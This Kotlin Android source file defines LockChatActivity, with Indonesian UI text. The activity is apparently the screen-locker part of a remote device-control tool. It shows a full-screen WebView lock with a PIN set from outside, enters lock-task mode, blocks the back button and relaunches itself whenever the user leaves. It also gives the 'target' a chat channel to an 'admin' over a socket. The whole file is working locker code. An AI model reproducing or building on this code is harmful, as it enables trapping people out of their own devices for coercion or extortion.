package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.media.MediaPlayer

class LockChatActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String = ""
    private var lockTitle: String  = "Perangkat Terkunci"
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    // Receive chat message from dashboard → inject ke WebView
    private val chatReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.CHAT_FROM_ADMIN") {
                val msg = intent.getStringExtra("message") ?: return
                val safe = msg.replace("\\", "\\\\").replace("'", "\\'")
                webView.post {
                    webView.evaluateJavascript("receiveAdminMessage('$safe')", null)
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN) ?: ""
    lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE) ?: "Perangkat Terkunci"
    setupWebView()
    registerReceivers()
    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
        val msg = DeviceService.lastPendingChat
        val msgTime = DeviceService.lastPendingChatTime
        if (msg.isNotEmpty() && System.currentTimeMillis() - msgTime < 4000) {
            val safe = msg.replace("\\", "\\\\").replace("'", "\\'")
            webView.evaluateJavascript("receiveAdminMessage('$safe')", null)
            DeviceService.lastPendingChat = ""
        }
    }, 600)
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            if (dpm.isLockTaskPermitted(packageName)) startLockTask()
        } catch (_: Exception) {}
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN) ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE) ?: lockTitle
    }

    override fun onBackPressed() { if (!isUnlocked) return; super.onBackPressed() }

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isUnlocked) return@postDelayed
            startActivity(Intent(this, LockChatActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            })
        }, 300)
    }

    override fun onStop() {
        super.onStop()
        if (isUnlocked) return
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            startActivity(Intent(this, LockChatActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            })
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.BLACK)
        webView.addJavascriptInterface(ChatBridge(), "ChatBridge")
        webView.webViewClient = WebViewClient()
        webView.loadDataWithBaseURL(null, buildLockChatHtml(), "text/html", "UTF-8", null)
        setContentView(webView)
    }

    private fun registerReceivers() {
        if (isReceiverRegistered) return
        val f1 = IntentFilter("com.sync.xxx.UNLOCK")
        val f2 = IntentFilter("com.sync.xxx.CHAT_FROM_ADMIN")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(unlockReceiver, f1, RECEIVER_NOT_EXPORTED)
            registerReceiver(chatReceiver,   f2, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(unlockReceiver, f1)
            registerReceiver(chatReceiver,   f2)
        }
        isReceiverRegistered = true
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            try { unregisterReceiver(chatReceiver) }   catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class ChatBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    sendBroadcast(Intent(DeviceService.ACTION_COMMAND).apply {
                        putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                        putExtra(DeviceService.EXTRA_VALUE, "true")
                        setPackage(packageName)
                    })
                    sendBroadcast(Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) })
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle

        // Target kirim pesan ke admin → DeviceService forward ke socket
        @JavascriptInterface
        fun sendChatToAdmin(message: String) {
            sendBroadcast(Intent(DeviceService.ACTION_COMMAND).apply {
                putExtra(DeviceService.EXTRA_COMMAND, "chatFromTarget")
                putExtra(DeviceService.EXTRA_VALUE, message)
                setPackage(packageName)
            })
        }
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close(); prepare(); start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (_: Exception) {}
    }

    private fun buildLockChatHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;").replace("<", "&lt;").replace("\"", "&quot;")
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080010;
  --red:#ff2b3b;
  --purple:#a855f7;
  --text:#f0e6ff;
  --text2:#7c3aed;
  --card:rgba(30,10,50,.85);
  --border:rgba(168,85,247,.25);
}
html,body{height:100%;width:100%;overflow:hidden;background:var(--bg);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
body{display:flex;flex-direction:column;position:relative}

/* BG */
body::before{content:'';position:fixed;inset:0;
  background:radial-gradient(ellipse 70% 50% at 50% -5%,rgba(168,85,247,.18),transparent 65%),
             radial-gradient(ellipse 50% 60% at 0% 80%,rgba(255,43,59,.08),transparent);
  pointer-events:none;z-index:0}
body::after{content:'';position:fixed;inset:0;
  background-image:linear-gradient(rgba(168,85,247,.03) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(168,85,247,.03) 1px,transparent 1px);
  background-size:40px 40px;pointer-events:none;z-index:0}

/* HEADER */
.hdr{
  position:relative;z-index:10;
  padding:16px 18px 12px;
  border-bottom:1px solid var(--border);
  background:rgba(10,0,20,.9);
  backdrop-filter:blur(20px);
  flex-shrink:0;
}
.hdr-top{display:flex;align-items:center;gap:12px;margin-bottom:14px}
.hdr-icon{width:42px;height:42px;border-radius:12px;
  background:rgba(168,85,247,.12);border:1px solid rgba(168,85,247,.3);
  display:flex;align-items:center;justify-content:center;color:#a855f7}
.hdr-title{font-size:18px;font-weight:800;color:#fff;letter-spacing:-.3px}
.hdr-sub{font-family:'Courier New',Courier,monospace;font-size:8px;color:#6d28d9;letter-spacing:2px;margin-top:2px}

/* TAB */
.tabs{display:flex;gap:6px}
.tab{flex:1;height:36px;border-radius:10px;border:1px solid var(--border);
  background:transparent;color:#6d28d9;
  font-family:'Courier New',Courier,monospace;font-size:9px;letter-spacing:1.5px;
  cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:5px}
.tab.active{background:rgba(168,85,247,.15);border-color:rgba(168,85,247,.5);color:#c084fc;
  box-shadow:0 0 16px rgba(168,85,247,.12)}

/* PANELS */
.panel{display:none;flex:1;overflow:hidden;flex-direction:column;position:relative;z-index:1}
.panel.show{display:flex}

/* ── CHAT PANEL ── */
.chat-msgs{flex:1;overflow-y:auto;padding:14px 14px 8px;display:flex;flex-direction:column;gap:8px}
.chat-msgs::-webkit-scrollbar{width:2px}
.chat-msgs::-webkit-scrollbar-thumb{background:var(--border)}
.msg-row{display:flex;flex-direction:column;max-width:80%}
.msg-row.admin{align-self:flex-start}
.msg-row.target{align-self:flex-end}
.msg-bubble{padding:9px 13px;border-radius:14px;font-size:13px;line-height:1.5}
.msg-row.admin .msg-bubble{
  background:rgba(168,85,247,.12);border:1px solid rgba(168,85,247,.22);
  color:#e2d9f3;border-radius:4px 14px 14px 14px}
.msg-row.target .msg-bubble{
  background:rgba(255,43,59,.1);border:1px solid rgba(255,43,59,.2);
  color:#ffe6e8;border-radius:14px 4px 14px 14px}
.msg-time{font-family:'Courier New',Courier,monospace;font-size:7px;color:#4a2070;margin-top:3px}
.msg-row.target .msg-time{text-align:right}
.msg-sender{font-family:'Courier New',Courier,monospace;font-size:8px;letter-spacing:1px;margin-bottom:3px}
.msg-row.admin .msg-sender{color:#a855f7}
.msg-row.target .msg-sender{color:#ff4d5a;text-align:right}

.chat-empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:10px;color:#3b1a5c;font-family:'Courier New',Courier,monospace;font-size:10px;letter-spacing:1px;text-align:center}

.chat-input-area{
  padding:10px 12px 14px;border-top:1px solid var(--border);
  background:rgba(10,0,20,.8);flex-shrink:0;display:flex;gap:8px;align-items:flex-end}
.chat-input{
  flex:1;min-height:40px;max-height:80px;
  border-radius:12px;background:rgba(255,255,255,.04);
  border:1.5px solid var(--border);color:#f0e6ff;
  font-family:'Outfit',sans-serif;font-size:13px;padding:9px 12px;
  outline:none;resize:none;line-height:1.4;
  transition:border-color .2s}
.chat-input:focus{border-color:rgba(168,85,247,.6);background:rgba(168,85,247,.04)}
.chat-input::placeholder{color:#3b1a5c}
.send-btn{
  width:40px;height:40px;border-radius:11px;flex-shrink:0;
  border:1px solid rgba(168,85,247,.3);
  background:rgba(168,85,247,.1);color:#a855f7;cursor:pointer;
  display:flex;align-items:center;justify-content:center;transition:all .2s}
.send-btn:active{background:rgba(168,85,247,.25);transform:scale(.93)}

/* ── PIN PANEL ── */
.pin-panel{flex:1;overflow-y:auto;padding:24px 20px;display:flex;flex-direction:column;align-items:center;gap:20px}
.pin-icon-wrap{position:relative;width:80px;height:80px;display:flex;align-items:center;justify-content:center}
.pin-ring{position:absolute;inset:0;border-radius:50%;border:1.5px solid rgba(168,85,247,.3);animation:rPulse 2s infinite}
.pin-ring2{position:absolute;inset:-10px;border-radius:50%;border:1px solid rgba(168,85,247,.12);animation:rPulse 2s infinite .5s}
@keyframes rPulse{0%,100%{opacity:.8;transform:scale(1)}50%{opacity:.3;transform:scale(1.08)}}
.pin-icon-bg{width:64px;height:64px;border-radius:50%;
  background:radial-gradient(circle,rgba(168,85,247,.15),rgba(168,85,247,.03));
  border:1.5px solid rgba(168,85,247,.4);display:flex;align-items:center;justify-content:center;color:#a855f7;
  box-shadow:0 0 30px rgba(168,85,247,.15)}
.pin-title{font-size:22px;font-weight:800;color:#fff;text-align:center;
  text-shadow:0 0 20px rgba(168,85,247,.3)}
.pin-sub{font-family:'Courier New',Courier,monospace;font-size:8px;color:#6d28d9;letter-spacing:2px}
.dots{display:flex;gap:14px}
.dot{width:13px;height:13px;border-radius:50%;border:1.5px solid rgba(168,85,247,.3);
  background:transparent;transition:all .18s}
.dot.filled{background:#a855f7;border-color:#a855f7;box-shadow:0 0 12px rgba(168,85,247,.8);transform:scale(1.1)}
.dot.error{border-color:var(--red);background:rgba(255,43,59,.2);animation:shake .35s ease}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
.pin-status{font-family:'Courier New',Courier,monospace;font-size:10px;letter-spacing:2px;color:#4a2070;min-height:18px;text-align:center}
.pin-status.err{color:var(--red)}
.pin-status.ok{color:#a855f7}

.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;width:100%;max-width:280px}
.key{height:62px;border-radius:13px;border:1px solid rgba(168,85,247,.18);
  background:linear-gradient(160deg,rgba(168,85,247,.08),rgba(40,10,60,.06));
  color:#f0e6ff;display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;-webkit-tap-highlight-color:transparent;transition:all .12s;
  box-shadow:0 2px 8px rgba(0,0,0,.5),inset 0 1px 0 rgba(168,85,247,.08);user-select:none}
.key .num{font-size:22px;font-weight:700;line-height:1}
.key .sub{font-family:'Courier New',Courier,monospace;font-size:7px;letter-spacing:2px;color:#7c3aed;margin-top:2px}
.key.del{color:#a855f7}
.key.empty{pointer-events:none;opacity:0}
.key:active{transform:scale(.93);background:rgba(168,85,247,.2);border-color:rgba(168,85,247,.5)}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-top">
    <div class="hdr-icon">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    </div>
    <div>
      <div class="hdr-title">$safeTitle</div>
      <div class="hdr-sub">LOCK V3 — SECURE CHANNEL</div>
    </div>
  </div>
  <div class="tabs">
    <button class="tab active" onclick="showTab('chat',this)">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
      LIVE CHAT
    </button>
    <button class="tab" onclick="showTab('pin',this)">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      INPUT PIN
    </button>
  </div>
</div>

<!-- CHAT PANEL -->
<div class="panel show" id="panel-chat">
  <div class="chat-msgs" id="chatMsgs">
    <div class="chat-empty" id="chatEmpty">
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
      <span>Kirim pesan ke admin<br>untuk meminta bantuan</span>
    </div>
  </div>
  <div class="chat-input-area">
    <textarea class="chat-input" id="chatInput" placeholder="Ketik pesan..." rows="1"
      oninput="this.style.height='auto';this.style.height=Math.min(this.scrollHeight,80)+'px'"
      onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMsg()}"></textarea>
    <button class="send-btn" onclick="sendMsg()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
    </button>
  </div>
</div>

<!-- PIN PANEL -->
<div class="panel" id="panel-pin">
  <div class="pin-panel">
    <div class="pin-icon-wrap">
      <div class="pin-ring2"></div><div class="pin-ring"></div>
      <div class="pin-icon-bg">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1.5" fill="currentColor" stroke="none"/></svg>
      </div>
    </div>
    <div class="pin-title">Masukkan PIN</div>
    <div class="pin-sub">4 DIGIT UNTUK MEMBUKA</div>
    <div class="dots"><div class="dot" id="d0"></div><div class="dot" id="d1"></div><div class="dot" id="d2"></div><div class="dot" id="d3"></div></div>
    <div class="pin-status" id="pinStatus">Ketuk angka di bawah</div>
    <div class="keypad" id="keypad">
      <div class="key" data-n="1"><span class="num">1</span><span class="sub">—</span></div>
      <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
      <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
      <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
      <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
      <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
      <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
      <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
      <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
      <div class="key empty"></div>
      <div class="key" data-n="0"><span class="num">0</span></div>
      <div class="key del" data-del="1">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
      </div>
    </div>
  </div>
</div>

<script>
// ── TABS ──
function showTab(id, btn) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('show'))
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'))
  document.getElementById('panel-' + id).classList.add('show')
  btn.classList.add('active')
}

// ── CHAT ──
var messages = []
function sendMsg() {
  var input = document.getElementById('chatInput')
  var text = input.value.trim()
  if (!text) return
  input.value = ''; input.style.height = '40px'
  addMessage('target', text)
  try { ChatBridge.sendChatToAdmin(text) } catch(e) {}
}
function receiveAdminMessage(msg) {
  addMessage('admin', msg)
}
function addMessage(from, text) {
  var empty = document.getElementById('chatEmpty')
  if (empty) empty.style.display = 'none'
  var container = document.getElementById('chatMsgs')
  var now = new Date()
  var time = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0')
  var row = document.createElement('div')
  row.className = 'msg-row ' + from
  row.innerHTML = '<div class="msg-sender">' + (from === 'admin' ? 'ADMIN' : 'KAMU') + '</div>' +
    '<div class="msg-bubble">' + escHtml(text) + '</div>' +
    '<div class="msg-time">' + time + '</div>'
  container.appendChild(row)
  container.scrollTop = container.scrollHeight
}
function escHtml(t) {
  return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
}

// ── PIN ──
var pin = '', blocked = false
document.getElementById('keypad').addEventListener('touchend', function(e) {
  e.preventDefault()
  var key = e.target.closest('.key')
  if (!key || key.classList.contains('empty')) return
  if (key.dataset.del) { doDelete(); return }
  if (key.dataset.n !== undefined) doPress(key.dataset.n)
}, { passive: false })
document.getElementById('keypad').addEventListener('click', function(e) {
  if (e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) return
  var key = e.target.closest('.key')
  if (!key || key.classList.contains('empty')) return
  if (key.dataset.del) { doDelete(); return }
  if (key.dataset.n !== undefined) doPress(key.dataset.n)
})
function doPress(n) {
  if (blocked || pin.length >= 4) return
  pin += n; updateDots()
  if (pin.length === 4) setTimeout(checkPin, 150)
}
function doDelete() {
  if (blocked) return
  pin = pin.slice(0, -1); updateDots()
  setStatus('', false, false)
}
function updateDots() {
  for (var i = 0; i < 4; i++) {
    var d = document.getElementById('d' + i)
    d.classList.toggle('filled', i < pin.length)
    d.classList.remove('error')
  }
}
function checkPin() {
  var ok = false
  try { ok = ChatBridge.tryUnlock(pin) } catch(e) {}
  if (ok) {
    setStatus('PIN Benar ✓', false, true)
  } else {
    setStatus('PIN Salah!', true, false)
    for (var i = 0; i < 4; i++) document.getElementById('d' + i).classList.add('error')
    blocked = true
    setTimeout(function() {
      pin = ''; blocked = false; updateDots(); setStatus('Coba lagi', false, false)
    }, 1200)
  }
}
function setStatus(msg, err, ok) {
  var el = document.getElementById('pinStatus')
  el.textContent = msg || 'Ketuk angka di bawah'
  el.className = 'pin-status' + (err ? ' err' : ok ? ' ok' : '')
}
</script>
</body>
</html>"""
    }
}